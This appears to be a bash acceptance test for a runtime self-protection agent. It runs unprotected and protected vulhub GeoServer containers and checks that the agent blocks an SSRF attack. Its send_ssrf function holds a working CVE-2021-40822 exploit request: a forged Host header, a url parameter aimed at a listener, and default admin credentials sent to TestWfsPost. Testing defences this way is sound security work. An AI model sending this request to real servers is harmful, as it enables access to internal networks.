#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_GEOSERVER_40822_IMAGE:-vulhub/geoserver:2.19.1}"
listener_image="${OHMYRASP_VULHUB_GEOSERVER_40822_LISTENER_IMAGE:-python:3-alpine}"
network="${OHMYRASP_VULHUB_GEOSERVER_40822_NETWORK:-ohmyrasp-geoserver-40822-net}"
baseline_name="${OHMYRASP_VULHUB_GEOSERVER_40822_BASELINE_NAME:-ohmyrasp-vulhub-geoserver-40822-baseline}"
protected_name="${OHMYRASP_VULHUB_GEOSERVER_40822_PROTECTED_NAME:-ohmyrasp-vulhub-geoserver-40822-protected}"
baseline_target="${OHMYRASP_VULHUB_GEOSERVER_40822_BASELINE_TARGET:-ohmyrasp-vulhub-geoserver-40822-baseline-target}"
protected_target="${OHMYRASP_VULHUB_GEOSERVER_40822_PROTECTED_TARGET:-ohmyrasp-vulhub-geoserver-40822-protected-target}"
baseline_port="${OHMYRASP_VULHUB_GEOSERVER_40822_BASELINE_PORT:-18620}"
protected_port="${OHMYRASP_VULHUB_GEOSERVER_40822_PROTECTED_PORT:-18621}"
host_agent_jar="$(pwd)/agent-java17/build/libs/ohmyrasp-agent-java17.jar"
baseline_dir="logs/vulhub-geoserver-40822-java17-baseline"
protected_dir="logs/vulhub-geoserver-40822-java17-protected"
protected_log="${protected_dir}/events.jsonl"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java17:agentJava17Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 777 "$protected_dir"
chmod 666 "$protected_log"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker logs "$baseline_target" > "${baseline_dir}/listener.log" 2>&1 || true
  docker logs "$protected_target" > "${protected_dir}/listener.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" "$baseline_target" "$protected_target" \
    >/dev/null 2>&1 || true
  docker network rm "$network" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" "$baseline_target" "$protected_target" \
  >/dev/null 2>&1 || true
docker network rm "$network" >/dev/null 2>&1 || true
docker network create "$network" >/dev/null

start_listener() {
  local name="$1"
  local marker="$2"
  docker run -d --name "$name" --network "$network" "$listener_image" sh -c \
    "mkdir -p /srv && printf '%s\n' '${marker}' > /srv/index.html && cd /srv && python -m http.server 18080 --bind 0.0.0.0" \
    >/dev/null
}

wait_for_geoserver() {
  local name="$1"
  local port="$2"
  local output="$3"
  local status
  for _ in $(seq 1 240); do
    status="$(curl -sS -o "$output" -w "%{http_code}" \
      "http://127.0.0.1:${port}/geoserver/web/" 2>/dev/null || true)"
    if [[ "$status" == "200" || "$status" == "302" ]]; then
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
        | grep -q .; then
      docker logs "$name" >&2 || true
      echo "${name} exited before exposing GeoServer at ${port}" >&2
      exit 1
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "${name} did not expose GeoServer at ${port}" >&2
  exit 1
}

send_ssrf() {
  local port="$1"
  local target="$2"
  local output="$3"
  curl -sS -o "$output" -w "%{http_code}" \
    -H "Host: ${target}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "form_hf_0=" \
    --data-urlencode "url=http://${target}:18080/" \
    --data-urlencode "body=" \
    --data-urlencode "username=admin" \
    --data-urlencode "password=admin" \
    "http://127.0.0.1:${port}/geoserver/TestWfsPost" || true
}

start_listener "$baseline_target" "ohmyrasp-geoserver-40822-baseline-relay"
start_listener "$protected_target" "ohmyrasp-geoserver-40822-protected-relay"

docker run -d --name "$baseline_name" --network "$network" -p "127.0.0.1:${baseline_port}:8080" \
  -e JAVA_OPTS= \
  "$image" >/dev/null

docker run -d --name "$protected_name" --network "$network" -p "127.0.0.1:${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java17.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_OPTS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java17.jar -Dohmyrasp.java17.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java17.block=true" \
  "$image" >/dev/null

wait_for_geoserver "$baseline_name" "$baseline_port" "${baseline_dir}/ready.response"
wait_for_geoserver "$protected_name" "$protected_port" "${protected_dir}/ready.response"

if ! grep -q '"event":"ohmyrasp-java17-agent-start"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 17 startup event in GeoServer CVE-2021-40822 protected container" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "GeoServer CVE-2021-40822 protected startup/readiness produced a detection" >&2
  exit 1
fi

baseline_status="$(send_ssrf "$baseline_port" "$baseline_target" "${baseline_dir}/ssrf.response")"
if [[ "$baseline_status" != "200" ]] \
    || ! grep -q 'ohmyrasp-geoserver-40822-baseline-relay' "${baseline_dir}/ssrf.response"; then
  cat "${baseline_dir}/ssrf.response" >&2 || true
  echo "baseline GeoServer CVE-2021-40822 did not relay to listener; status=${baseline_status}" >&2
  exit 1
fi
docker logs "$baseline_target" > "${baseline_dir}/listener.log" 2>&1 || true
if ! grep -q 'GET / HTTP/1.1' "${baseline_dir}/listener.log"; then
  cat "${baseline_dir}/listener.log" >&2 || true
  echo "baseline GeoServer CVE-2021-40822 listener did not record the relay request" >&2
  exit 1
fi

protected_status="$(send_ssrf "$protected_port" "$protected_target" "${protected_dir}/ssrf.response")"
if grep -q 'ohmyrasp-geoserver-40822-protected-relay' "${protected_dir}/ssrf.response"; then
  cat "${protected_dir}/ssrf.response" >&2 || true
  echo "protected GeoServer CVE-2021-40822 relayed listener content; status=${protected_status}" >&2
  exit 1
fi
if ! grep -q 'Java17RaspBlockException' "${protected_dir}/ssrf.response"; then
  cat "${protected_dir}/ssrf.response" >&2 || true
  echo "protected GeoServer CVE-2021-40822 response lacked block exception evidence; status=${protected_status}" >&2
  exit 1
fi
if ! grep -q '"algorithm":"java17_ssrf_request_parameter_url".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java17_ssrf_request_parameter_url block event for GeoServer CVE-2021-40822" >&2
  exit 1
fi
docker logs "$protected_target" > "${protected_dir}/listener.log" 2>&1 || true
if grep -q 'GET / HTTP/1.1' "${protected_dir}/listener.log"; then
  cat "${protected_dir}/listener.log" >&2
  echo "protected GeoServer CVE-2021-40822 listener received a relay request" >&2
  exit 1
fi

echo "vulhub GeoServer CVE-2021-40822 Java17 acceptance passed"
